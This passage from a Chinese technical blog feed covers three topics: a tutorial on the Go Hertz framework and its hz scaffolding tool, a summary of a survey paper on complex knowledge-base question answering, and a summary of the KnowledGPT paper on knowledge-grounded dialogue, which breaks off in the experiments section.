c.Bind(&amp;req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			fmt.Printf(<span class="string">"error: %v\n"</span>, err)</span><br><span class="line">		}</span><br><span class="line">        <span class="comment">// 校验</span></span><br><span class="line">		err = c.Validate(&amp;req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			fmt.Printf(<span class="string">"error: %v\n"</span>, err)</span><br><span class="line">		}</span><br><span class="line">	})</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> h.Spin()</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">1000</span> * time.Millisecond)</span><br><span class="line">	c, _ := client.NewClient()</span><br><span class="line">	req := protocol.Request{}</span><br><span class="line">	resp := protocol.Response{}</span><br><span class="line">	req.SetMethod(consts.MethodGet)</span><br><span class="line">	req.SetRequestURI(<span class="string">"http://127.0.0.1:8080/customValidate?a=123"</span>)</span><br><span class="line">	c.Do(context.Background(), &amp;req, &amp;resp)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="hz">hz</h2>
<p>Hertz 的一大优势就在于，可以通过 hz 工具，根据 IDL 生成项目脚手架，非常便捷易用。hz 支持 Thrift 与 Protobuf 两种 IDL，在基础的 IDL 的基础上，hz 提供了<a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/toolkit/annotation/">注解</a>能力满足 HTTP 框架所需的参数绑定、校验、路由注册功能。</p>
<h3 id="field-注解">Field 注解</h3>
<table>
<colgroup>
<col style="width: 38%">
<col style="width: 61%">
</colgroup>
<thead>
<tr class="header">
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> api.raw_body</td>
<td> 生成 “raw_body” tag，绑定 body bytes，优先级最低</td>
</tr>
<tr class="even">
<td> api.query</td>
<td> 生成 “query” tag，绑定 query 中参数，例如 “?query=hertz&amp;…”</td>
</tr>
<tr class="odd">
<td>api.header</td>
<td> 生成 “header” tag，绑定 header</td>
</tr>
<tr class="even">
<td>api.cookie</td>
<td> 生成 “cookie” tag，绑定 cookie</td>
</tr>
<tr class="odd">
<td>api.body</td>
<td> 生成 “json” tag，绑定 body
form 中的 "key-value"，“content-type” 需为 "application/json"</td>
</tr>
<tr class="even">
<td>api.path</td>
<td> 生成 “path” tag，绑定路由中的参数</td>
</tr>
<tr class="odd">
<td> api.form</td>
<td> 生成 “form” tag，绑定 body
form 中的 "key-value"<br>“content-type” 需为 "multipart/form-data" 或 "application/x-www-form-urlencoded"</td>
</tr>
<tr class="even">
<td>api.go_tag (protobuf) go.tag (thrift)</td>
<td> 透传 go_tag，会生成 go_tag 里定义的内容</td>
</tr>
<tr class="odd">
<td> api.vd</td>
<td> 生成 “vd” tag，用于参数校验</td>
</tr>
<tr class="even">
<td> api.none</td>
<td> 生成 “-” tag，不参与参数绑定与序列化，详情参考 <a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/toolkit/more-feature/api_none/">api.none
注解说明</a></td>
</tr>
</tbody>
</table>
<p>参数绑定优先级如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">path &gt; form &gt; query &gt; cookie &gt; header &gt; json &gt; raw_body</span><br></pre></td></tr></tbody></table></figure>
<h3 id="method注解">Method 注解</h3>
<table>
<thead>
<tr class="header">
<th>注解</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> api.get</td>
<td> 定义 GET 方法及路由</td>
</tr>
<tr class="even">
<td> api.post</td>
<td> 定义 POST 方法及路由</td>
</tr>
<tr class="odd">
<td> api.put</td>
<td> 定义 PUT 方法及路由</td>
</tr>
<tr class="even">
<td> api.delete</td>
<td> 定义 DELETE 方法及路由</td>
</tr>
<tr class="odd">
<td> api.patch</td>
<td> 定义 PATCH 方法及路由</td>
</tr>
<tr class="even">
<td> api.options</td>
<td> 定义 OPTIONS 方法及路由</td>
</tr>
<tr class="odd">
<td> api.head</td>
<td> 定义 HEAD 方法及路由</td>
</tr>
<tr class="even">
<td> api.any</td>
<td> 定义 ANY 方法及路由</td>
</tr>
</tbody>
</table>
<p>绑定 HTTP 方法及路由，很直观。</p>
<h3 id="案例">案例</h3>
<p>idl，hello.thrift 如下，使用了很多的 hz 注解。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct MultiTagRequest {</span><br><span class="line">    1: required string QueryTag (api.query = "query"),</span><br><span class="line">    2: required string RawBodyTag (api.raw_body = "raw_body"),</span><br><span class="line">    3: required string PathTag (api.path = "path"),</span><br><span class="line">    4: required string FormTag (api.form = "form"),</span><br><span class="line">    5: required string HeaderTag (api.header = "header"),</span><br><span class="line">    6: required string BodyTag (api.body = "body"),</span><br><span class="line">    7: required string GoTag (go.tag = "json:\"go\" goTag:\"tag\""),</span><br><span class="line">    8: required string VdTag (api.vd = "$!='?'"),</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">struct Request {</span><br><span class="line">    1: required string id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">struct Response {</span><br><span class="line">    1: required string id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">service Hertz {</span><br><span class="line">    Response Method(1: MultiTagRequest request) (api.get = "/company/:path/hello"),</span><br><span class="line">    Response Method1(1: Request request) (api.get = "/company/department/group/user:id/name"),</span><br><span class="line">    Response Method2(1: Request request) (api.post = "/company/department/group/user:id/sex"),</span><br><span class="line">    Response Method3(1: Request request) (api.put = "/company/department/group/user:id/number"),</span><br><span class="line">    Response Method4(1: Request request) (api.delete = "/company/department/group/user:id/age"),</span><br><span class="line">    Response Method5(1: Request request) (api.options = "/school/class/student/name"),</span><br><span class="line">    Response Method6(1: Request request) (api.head = "/school/class/student/number"),</span><br><span class="line">    Response Method7(1: Request request) (api.patch = "/school/class/student/sex"),</span><br><span class="line">    Response Method8(1: Request request) (api.any = "/school/class/student/grade/ubjects"),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后，运行 <code>hz new -idl
hello.thrfit</code>，生成脚手架，并 <code>go mod
tidy</code> 安装依赖，目录结构如下。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">❯ tree -r .                                                                                                        </span><br><span class="line">.</span><br><span class="line">├── script</span><br><span class="line">│&nbsp;&nbsp; └── bootstrap.sh</span><br><span class="line">├── router_gen.go</span><br><span class="line">├── router.go</span><br><span class="line">├── main.go</span><br><span class="line">├── hello.thrift</span><br><span class="line">├── go.sum</span><br><span class="line">├── go.mod</span><br><span class="line">├── build.sh</span><br><span class="line">└── biz</span><br><span class="line">    ├── router</span><br><span class="line">    │&nbsp;&nbsp; ├── register.go</span><br><span class="line">    │&nbsp;&nbsp; └── hello</span><br><span class="line">    │&nbsp;&nbsp;     ├── middleware.go</span><br><span class="line">    │&nbsp;&nbsp;     └── hello.go</span><br><span class="line">    ├── model</span><br><span class="line">    │&nbsp;&nbsp; └── hello</span><br><span class="line">    │&nbsp;&nbsp;     └── hello.go</span><br><span class="line">    └── handler</span><br><span class="line">        ├── ping.go</span><br><span class="line">        └── hello</span><br><span class="line">            └── hertz.go</span><br></pre></td></tr></tbody></table></figure>
<p>下面我们逐个分析。</p>
<h3 id="main.go">main.go</h3>
<p>项目的入口文件，创建 server、注册路由并运行。如果要修改服务选项，可以在 <code>server.Default()</code> 中传入 options。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	h := server.Default()</span><br><span class="line"></span><br><span class="line">	register(h)</span><br><span class="line">	h.Spin()</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="router.go">router.go</h3>
<p>自定义路由，默认会注册 <code>/ping</code> 用于调试。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// customizeRegister registers customize routers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">customizedRegister</span><span class="params">(r *server.Hertz)</span></span> {</span><br><span class="line">	r.GET(<span class="string">"/ping"</span>, handler.Ping)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// your code ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="router_gen.go">router_gen.go</h3>
<p>由 <code>main</code> 函数调用，注册所有路由，即 idl 中定义的与用户自定义的。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// register registers all routers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">register</span><span class="params">(r *server.Hertz)</span></span> {</span><br><span class="line"></span><br><span class="line">	router.GeneratedRegister(r)</span><br><span class="line"></span><br><span class="line">	customizedRegister(r)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="hz-1">.hz</h3>
<p>标识项目由 <code>hz</code> 工具搭建。</p>
<h3 id="biz">biz/</h3>
<p>业务逻辑目录。</p>
<h4 id="handler">handler/</h4>
<p>HandlerFunc 的逻辑。</p>
<h5 id="hello">hello/</h5>
<p>对应 <code>hello.thrift</code>，<code>hertz.go</code> 来源于定义的 <code>service
Hertz</code>。一个 HandlerFunc 例子如下，帮我们完成了参数的绑定校验以及响应的渲染。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Method .</span></span><br><span class="line"><span class="comment">// @router /company/:path/hello [GET]</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Method</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">	<span class="keyword">var</span> err error</span><br><span class="line">	<span class="keyword">var</span> req hello.MultiTagRequest</span><br><span class="line">	err = c.BindAndValidate(&amp;req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		c.String(consts.StatusBadRequest, err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	resp := <span class="built_in">new</span>(hello.Response)</span><br><span class="line"></span><br><span class="line">	c.JSON(consts.StatusOK, resp)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="model">model/</h4>
<p>idl 中的结构体，也就是 model 层。</p>
<h5 id="hellohello.go">hello/hello.go</h5>
<p>同样，名字对应 <code>hello.thrift</code>。一个 Request 代码如下，thrift
tag 用于 thrift 序列化和反序列化，json
tag 用于 json 序列化与反序列化，query/path/form 等 tag 用于参数绑定。这些都是 hz 工具根据 idl 与注解生成的。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MultiTagRequest <span class="keyword">struct</span> {</span><br><span class="line">	QueryTag   <span class="keyword">string</span> <span class="string">`thrift:"QueryTag,1,required" json:"QueryTag,required" query:"query,required"`</span></span><br><span class="line">	RawBodyTag <span class="keyword">string</span> <span class="string">`thrift:"RawBodyTag,2,required" json:"RawBodyTag,required" raw_body:"raw_body,required"`</span></span><br><span class="line">	PathTag    <span class="keyword">string</span> <span class="string">`thrift:"PathTag,3,required" json:"PathTag,required" path:"path,required"`</span></span><br><span class="line">	FormTag    <span class="keyword">string</span> <span class="string">`thrift:"FormTag,4,required" form:"form,required" json:"FormTag,required"`</span></span><br><span class="line">	HeaderTag  <span class="keyword">string</span> <span class="string">`thrift:"HeaderTag,5,required" header:"header,required" json:"HeaderTag,required"`</span></span><br><span class="line">	BodyTag    <span class="keyword">string</span> <span class="string">`thrift:"BodyTag,6,required" form:"body,required" json:"body,required"`</span></span><br><span class="line">	GoTag      <span class="keyword">string</span> <span class="string">`thrift:"GoTag,7,required" json:"go" goTag:"tag" form:"GoTag,required" query:"GoTag,required"`</span></span><br><span class="line">	VdTag      <span class="keyword">string</span> <span class="string">`thrift:"VdTag,8,required" form:"VdTag,required" json:"VdTag,required" query:"VdTag,required" vd:"$!='?'"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="router">router/</h4>
<p>路由注册逻辑。在 <code>middlerware.go</code> 可以为每个路由使用单独的中间件。</p>
<h3 id="更新">更新</h3>
<p>如果 idl 发生了变更，或者新加了服务，可以通过 <code>hz
update</code> 来对项目进行更新。</p>
<p>新建一个 <code>bye.thrift</code>，代码如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> Request {</span><br><span class="line">    <span class="number">1</span>: required <span class="keyword">string</span> id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Response {</span><br><span class="line">    <span class="number">1</span>: required <span class="keyword">string</span> id,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">service ByeBye {</span><br><span class="line">    Response bye(<span class="number">1</span>: Request req) (api.get = <span class="string">"/bye"</span>),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>输入 <code>hz update -idl
bye.thrift</code>，可以发现 <code>biz</code> 目录下的目录都新增了 <code>bye/</code> 文件夹，存放相关的 Handler、model。</p>
<h2 id="总结">总结</h2>
<p>本篇博客介绍了 Hertz 框架的基本使用，通过 hz 工具构建项目并进行分析。相信读完本篇博客，读者可以基本掌握 Hertz 的用法，更深的用法（例如中间件等）可以参考官方文档。按原本的计划，我本该去读 Hertz 源码，了解背后原理。但我后来发现，作为初学者，能够掌握框架用法就已经够了，更深入的读源码并不会给日常开发带来多大帮助。而 Redis、消息队列这些中间件，则是需要深入了解原理，它们构建了后端服务的核心缓存和业务流转逻辑，稍有不慎就会危害线上服务，造成重大事故。因此，我后面会花更多时间在这些知识的学习上，框架会用即可。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cloudwego.io/zh/blog/2022/06/21/字节跳动开源-go-http-框架-hertz-设计实践/">字节跳动开源
Go HTTP 框架 Hertz 设计实践 | CloudWeGo</a></li>
<li><a href="https://www.cloudwego.io/zh/docs/hertz/">Hertz |
CloudWeGo</a></li>
<li><a href="https://www.cloudwego.io/zh/docs/hertz/tutorials/basic-feature/binding-and-validate/">绑定与校验
| CloudWeGo</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
        <category>微服务</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>微服务</tag>
        <tag>HTTP</tag>
        <tag>Hertz</tag>
        <tag>字节跳动</tag>
      </tags>
  </entry>
  <entry>
    <title>基于知识库的问答综述（KBQA）</title>
    <url>/blog/2021/10/25/KBQA-survey/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一篇 2021 年的知识库问答的综述，《A Survey on Complex Knowledge
Base Question Answering:Methods, Challenges and
Solutions》，论文收录在 IJCAI
2021 中。这篇文章主要介绍了知识库问答的背景与挑战，并总结介绍了两大主流方法：基于语义解析（semantic
parsing-based，SP-based）和基于信息检索（information
retrivel-based，IR-based）。 <span id="more"></span></p>
<h2 id="知识库问答">知识库问答</h2>
<p>知识库是一个结构化的数据库，它与知识图谱类似，由（主体 Subject，关系 Relation，客体 Object）三元组组成，例如（JK 罗琳，出生地，英国），常见的知识库有 Freebase 等。这个三元组可以用来回答 “JK 罗琳出生在哪里？” 的问题。与简单的、答案与主体直接相连的简单 QA 不同，复杂 QA 查询任务涉及多跳推理甚至一些聚合关系。例如下图知识库，“谁是 The
Jeff Probst Show 提名的 TV
Producer 的第一任妻子” 问题的答案，包含多个实体和多跳处理逻辑。 <img src="multi-hop.png"></p>
<p>KBQA 的第一步是识别问题中的主体并链接到知识库中的实体，然后根据实体的邻域推导问题答案。这里分为两种方法基于语义解析和基于信息检索的两种方法。语义解析的思想是将自然语言问题表示为可以在知识库中进行查询的符号化的逻辑形式，然后再用逻辑语言进行查询（例如 SQL）。基于信息检索的方法思想是构建一个问题特定的知识图包含了相关的所有信息，然后将所有实体按相关性进行排序。然而，这些方法会面临以下挑战：</p>
<ul>
<li>基于语义解析的方法很难覆盖复杂的查询（多跳推理、约束关系、数值计算等）。类似的，基于信息检索的方法也很难回答复杂的问题，检索的实体范围可能太小，而且解释性差。</li>
<li>复杂的实体和关系会使得搜索空间过大（逻辑形式、候选结果等），搜索开销过大。</li>
<li>两种方法将问题理解看作重要的步骤，当问题的语法和语义复杂时，模型需要有很强的自然语言理解和生成能力。</li>
<li>弱监督问题。问答数据集中往往只存在问题和答案，缺少推理路径，而标注这样的推理路径成本过于高昂。弱监督问题给两种方法都带来了困难。</li>
</ul>
<p>评估指标上，KBQA 往往是从答案集合上选出置信度最高的，常见的评估指标由 F1、准确率、召回率、Hits@1 等。</p>
<h2 id="主流方法">主流方法</h2>
<p>流程图如下图所示。 <img src="methods.png"></p>
<h3 id="基于语义解析的方法">基于语义解析的方法</h3>
<p>旨在将自然语言问题解析为逻辑形式，按照以下步骤：</p>
<ol type="1">
<li>问题编码</li>
<li>逻辑解析</li>
<li>逻辑验证</li>
<li>逻辑执行</li>
</ol>
<p>优点：解释性强</p>
<p>缺点：严重依赖逻辑形式和解析算法的设计，成为性能提升的瓶颈</p>
<h3 id="基于信息检索的方法">基于信息检索的方法</h3>
<p>旨在根据问题检索候选答案集合并对其进行排序，按照以下步骤：</p>
<ol type="1">
<li>确定中心实体，提取问题特定的部分知识子图</li>
<li>问题编码</li>
<li>图推理，沿着相邻实体关系进行语义匹配，传播和聚合信息</li>
<li>按照置信度进行排序</li>
</ol>
<p>优点：端到端训练</p>
<p>缺点：解释性差</p>
<h2 id="挑战与解决方案">挑战与解决方案</h2>
<p>论文总结了两种方法面临的挑战和解决方案，汇总成下面的表格。</p>
<p><img src="summary.png"></p>
<h2 id="总结和展望">总结和展望</h2>
<p>论文主要介绍了两种典型的知识库问答方法，总结了它们面临的挑战及解决方案，并指出复杂 KBQA 未来的可能研究方向：</p>
<ul>
<li>在线学习。已有的复杂 KBQA 系统都是离线学习、在线部署。然而用户的反馈可能是改进 KBQA 的方法。基于此，一些工作开始利用用户反馈去纠正 KBQA 的回答。还有一些工作直接让用户参与到了问题解析过程中。</li>
<li>鲁棒性和可解释性。已有的方法虽然可以在基准数据集上可以取得很好的结果，但是遇到分布之外的情况可能无法很好处理。有研究人员开始提出相关的数据集来解决该问题。</li>
<li>更通用的知识库。知识库往往是不完整的，一些工作开始引入文本、图像来进行更复杂的 KBQA 推理。关于知识库更普遍的定义和更灵活的使用方法能让 KBQA 发展的更好。</li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答检索</category>
      </categories>
      <tags>
        <tag>问答</tag>
        <tag>知识库</tag>
        <tag>KBQA</tag>
      </tags>
  </entry>
  <entry>
    <title>KnowledGPT: 基于预训练语言模型的知识对话</title>
    <url>/blog/2022/05/03/KnowledGPT/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《Knowledge-Grounded Dialogue Generation with Pre-trained Language
Models》是由北大发表的论文，旨在通过预训练的语言模型进行知识对话，论文收录于 EMNLP
2020 主会。代码公开在 <a href="https://github.com/zhaoxlpku/KnowledGPT">zhaoxlpku/KnowledGPT
(github.com)</a>。论文通过在预训练语言模型（如 GPT）外配置知识选择模块，从非结构化的知识文本中选择知识，并通过一种无监督的方法联合优化知识选择和知识对话生成。论文提出的 KnowLEDGPT 在 Wizard 和 CMU
DoG 两个数据集上的自动 &amp; 人工评估实现了 SOTA。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>数据驱动的开放域对话系统一直饱受通用性、无用回复的问题。当人类参与者试图深入某个特定主题时，这种缺陷尤其严重。虽然预训练模型通过模型扩张、更多的数据改善了这一问题，其可以在训练期间记住足够多的语言模式，但它们仍只能捕获 “平均语义”。当对话需要知识才能进行下去时，除非模型已经在预训练阶段 “见过” 相关知识并以正确的方式存储在参数中且可以正确关联，否则模型生成的回复仍可能是通用无用的。这与人类的真实对话还有着不小的差距。</p>
<p>最近，出现了两条似乎有望弥合差距的研究方向。第一种是大规模的预训练模型，通过模型扩张、大量数据在预训练期间学到足够多的语言模式，缓解通用性回复的问题。然而，这种简单粗暴的方法还是只能捕获数据的 “平均” 语义。当需要特定知识时，生成的回复仍然可能是通用的。</p>
<p>另一种方法是显式地引入外部知识。知识可分为结构化的知识图谱和非结构化的文本（维基百科等）。由于高质量的知识图谱更难获得，而非结构化的文本则更易获得，成本低廉而且数量庞大。然而，这些文本往往长而冗余，而预训练模型往往会受到序列长度的限制。事实上，该问题上，模型容量和处理长输入的能力是冲突的。一方面，在海量的文本上预训练，模型必须设置一个输入上限。另一方面，在回复生成时，需要尽可能多的保留候选知识，以保证相关知识的召回。这一冲突是知识对话生成的基本阻碍。</p>
<p>为了克服这一问题，研究者开始引入知识选择模块，从若干相关知识候选中选择最相关的知识子集，进而显著序列长度。然而，现在的一些方法中，知识选择模块要么与模型强耦合，无法应用在预训练模型中；要么通过人工标注数据训练，成本昂贵。本文提出了一种无监督的方法，将知识选择形式化为基于 BERT 的序列预测任务。通过计算真实回复和候选知识间的相似度作为伪标签，预热模型。再通过强化学习、课程学习的方法，交替更新知识选择模型和回复生成模型。因此，知识选择通过回复生成的反馈得到进一步优化。</p>
<p>论文在 Wizard of Wikipedia 和 CMU Document Grounded
Conversations 两个数据集上进行实验。结果表明，模型可以显着优于最先进的方法以及一些以启发式方式使用的预训练模型，达到新的 SOTA。此外，作为副产品，知识选择模块在维基百科向导上的知识选择准确性方面也优于最先进的模型，这意味着其他模型也可以从该组件中受益。</p>
<h2 id="问题定义">问题定义</h2>
<ul>
<li>数据集<span class="math inline"> \(D=\{(U_i,D_i,r_i)\}_{i=1}^N\)</span></li>
<li><span class="math inline">\(U_i\)</span> 代表上下文</li>
<li><span class="math inline"> \(D_i\)</span> 代表与<span class="math inline"> \(U_i\)</span> 相关的文档</li>
<li><span class="math inline"> \(r_i\)</span> 代表给定<span class="math inline"> \(U_i\)</span> 上下文，基于<span class="math inline"> \(D_i\)</span> 的回复</li>
<li>目标：<span class="math inline">\(\max
P(r_i|U_i,D_i;\theta)\)</span></li>
</ul>
<p>由于论文使用 GPT2 建模此条件概率，因此将上式改写为： <span class="math display">\[
\begin{aligned}
P(r_i|U_i,D_i)&amp;=P(r_i|g(U,D);\theta)\\
&amp;=\prod_i^{l_r}P(r_i|g(U,D),r_{1:t-1};\theta)
\end{aligned}
\]</span> <span class="math inline">\(g(U,D)\)</span> 将知识和上下文结合的模块，包含知识选择。问题就变成了如何定义<span class="math inline"> \(g(U,D)\)</span> 和如何微调<span class="math inline"> \(\theta\)</span>。显然，可以直接将<span class="math inline"> \(D\)</span> 和<span class="math inline"> \(U\)</span> 直接拼接在一起然后截断，但是这可能会删去重要的知识且引入噪声，进而影响性能。<span class="math inline">\(g(U,D)\)</span> 的学习面临以下问题：</p>
<ul>
<li>如何对<strong>上下文与外部知识之间的相关性</strong>进行建模</li>
<li>当<strong>缺少真实知识标签时</strong>如何学习<span class="math inline"> \(g(U,D)\)</span></li>
<li> 如何将<span class="math inline"> \(g(U,D)\)</span> 和 GPT-2 模型与 D <strong>联合优化</strong>，从而使两者相互促进。</li>
</ul>
<h2 id="方法">方法</h2>
<p>模型的架构如下图所示。在 Transformer
架构的基础上，知识选择模块由上下文感知<strong>知识编码器</strong>和<strong>顺序知识选择器</strong>组成。知识编码器通过自注意力层捕获上下文
U 和 D
中的每个句子之间的交互模式，然后将这些模式馈送到知识选择器，逐步地解码有用的知识。由于无法获得人工标记，学习方法从充分利用回复构建的伪标记开始，通过强化学习方法和课程学习方法交替优化知识选择和回复生成。</p>
<p><img src="architecture.png"></p>
<h3 id="上下文感知知识编码器">上下文感知知识编码器</h3>
<p>虽然名字很玄乎，但是原理很简单。将上下文<span class="math inline"> \(U_i\)</span> 和每个候选知识<span class="math inline"> \(d_i\in
D_i=(d_1,d_2,\cdots,d_m)\)</span> 分别拼接起来，馈入 BERT，取最后一层的 <strong>[CLS]</strong> 的向量作为上下文表征。也就是架构图左侧的下半部分。用<span class="math inline"> \(E=(e_1,e_2,\cdots,e_m)\)</span> 代表编码器的输出，其中<span class="math inline"> \(e_i\)</span> 代表知识<span class="math inline"> \(d_i\)</span> 和上下文拼接后的上下文表征。</p>
<h3 id="顺序知识选择器">顺序知识选择器</h3>
<p>这里的原理也很简单。前面提到，论文将知识选择视作<strong>序列预测</strong>任务（而非序列分类）。换而言之，知识选择模块意在<strong>顺序地解码出一个知识序列子集</strong>。也就是类似 RNN 的自回归方法。这样建模的原因可能是无需额外考虑序列分类时拼接的顺序。</p>
<p>具体而言，这一块有一个 LSTM 解码器组成，输入为编码器的输出序列<span class="math inline"> \(E\)</span>。解码每一步与输入序列计算 Attention，从知识表征中选择输出，直到输出特殊的结束符号<span class="math inline"> \(e_{spe}\)</span> 或者序列长度达到上限。另外，在解码时的每一步，需要排除已经输出的知识，显然同一个知识没有必要输出两次。最后得到的解码输出就是选择后的知识序列<span class="math inline"> \(D'\)</span>，<span class="math inline">\(g(U,D)\)</span> 定义为<span class="math inline"> \(U\cup D'\)</span>。</p>
<h3 id="学习策略">学习策略</h3>
<p>由于知识选择器的训练过程是无标签的，这可能会很困难。在最近的一篇论文中（Kim
et al., 2020），当人类标签被移除时，知识选择的准确率从 27% 下降到
0.3%。另外，在端到端的模型中，知识选择的结果作为回复生成的输入，二者耦合纠缠。在训练早期，<span class="math inline">\(g(U,D)\)</span> 可能性能很差，训练噪声传入 GPT-2 再反向传播至<span class="math inline"> \(g(U,D)\)</span>，可能会导致两边模型效果都很差。因此，论文提出了一种弱监督的联合优化策略，如下所示。</p>
<h4 id="伪标签构建">伪标签构建</h4>
<p>为了减轻联合优化中的错误累积，论文考虑构建弱监督信号并预热 g (U, D)
的学习和 GPT-2 的微调。
直觉来看，人类的回复带有与知识候选相关性的线索，因此可以用来构建伪标签。具体来说，首先根据相似性<span class="math inline"> \(\{Sim(d_t, r)\}_{t=1}^m\)</span> 将<span class="math inline"> \(D=\{d_t\}_{t=1}^m\)</span> 降序排序为<span class="math inline"> \(\{d_{j_t}\}^m_{t=1}\)</span>。其中 $Sim (・,・)
$ 表示<strong>相似度函数</strong>，例如 uni-gran F1。 然后构建 D 的子集：
<span class="math display">\[
\overline D=\{d_{j_1},d_{j_2},\cdots,d_{j_\overline m}\}
\]</span></p>
<p><span class="math display">\[
\overline m=\arg\max_t(Sim(d_{j_{1:t}},r))
\]</span> 其中，<span class="math inline">\(d_{j_{1:t}}\)</span> 是<span class="math inline"> \(\{d_{j_i}\}_{i=1}^t\)</span> 的拼接结果。上述子集的构建就是取相似性降序知识的前缀拼接结果中，与真实回复相似性最大的拼接结果对应的知识子集。然后以<span class="math inline"> \(\overline
D\)</span> 为知识选择的伪标签，分别<strong>预热</strong>知识选择模块和回复生成模块。即，通过最大似然分别优化<span class="math inline"> \(D_K=\{(U_i,D_i,\overline
D_i\}_{i=1}^N\)</span> 和<span class="math inline"> \(D_G=\{(U_i,\overline
D_i,r_i\}_{i=1}^N\)</span>。</p>
<h4 id="联合优化">联合优化</h4>
<p><strong>强化学习</strong>。论文使用策略梯度法继续训练<span class="math inline"> \(g(U,D)\)</span>。其中，<span class="math inline">\(g(U,D)\)</span> 由 GPT-2 进一步监督且直接针对目标指标进行优化（例如实验中的 F1）。具体而言，在知识选择器解码时的每一步，从概率分布<span class="math inline"> \(P(d_i|U,d_{1:t-1})\)</span> 中采样另一个知识，遵循同样的停止策略，定义如下的损失函数：
<span class="math display">\[
\mathcal L_K=-\frac 1 N\sum_{i=1}^N(\tilde R_i \sum_{t=1}^{|\tilde
D_i|}logP(d_{i,j_t}|U_i,d_{i,j_{1:t-1}}))
\]</span></p>
<p><span class="math display">\[
\tilde R_i=R(\tilde D_i)-b
\]</span> 其中，<span class="math inline">\(R(\tilde
D_i)=Sim(r'_i,r_i)\)</span>，<span class="math inline">\(r_i'\)</span> 是 GPT-2 利用<span class="math inline"> \(U_i,\tilde D_i\)</span> 生成的回复，<span class="math inline">\(b=\sum_{i=1}^N R(\tilde
D_i)/N\)</span> 是基线用以减小梯度估计的方差。可以看到，如果获得比基线更高的奖励，即<span class="math inline"> \(R(\tilde D_i)&gt;0\)</span>，则最小化 <span class="math inline">\(\mathcal L_K\)</span> 等效于最大化<span class="math inline"> \(\tilde D_i\)</span> 的条件似然。</p>
<p><strong>课程学习</strong>。虽然模型已经在伪标签上进行过预热，
但是在训练之初，<span class="math inline">\(D'\)</span> 可能还是差于<span class="math inline"> \(\overline D\)</span>。因此，论文将<span class="math inline"> \(D',\overline
D\)</span> 混合，使用课程学习策略微调。具体来说，是设置一个超参数<span class="math inline"> \(p\)</span>，控制从两者间采样<span class="math inline"> \(D\)</span> 作为回复生成模块的输入的概率，并随着训练过程调整<span class="math inline"> \(p\)</span> 的大小，完成从<span class="math inline"> \(\overline D\)</span> 到<span class="math inline"> \(D\)</span> 的迁移。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集指标">数据集 &amp; 指标</h3>
<p>论文在 Wizard of Wikipedia 和 CMU Document Grounded
Conversations 两个数据集上进行实验。这两个数据集都是在 Amazon Mechanical
Turk 上通过众包构建的，使用 Wikipedia
作为知识库，并由数据所有者分为训练集、验证集和测试集。Wizard
中的数据主题涵盖范围很广（1365
个），每次对话都发生在有权访问特定主题知识的向导和渴望从向导学习该主题的学徒之间。测试集分为两个子集：Test
Seen 和 Test Unseen。 Test Seen 包含新的对话，主题出现在训练集中，而
Test Unseen 中的主题从未出现在训练集和验证集中。与 Wizard 不同，CMU
DoG 专注于电影领域，除了向导 - 学徒间的对话，数据还包含两个了解文档并试图深入讨论内容的用户之间的对话。</p>
<p>自动评估指标：真实回复的困惑度 (PPL)、BOW Embedding 和 unigram F1
作为指标。</p>
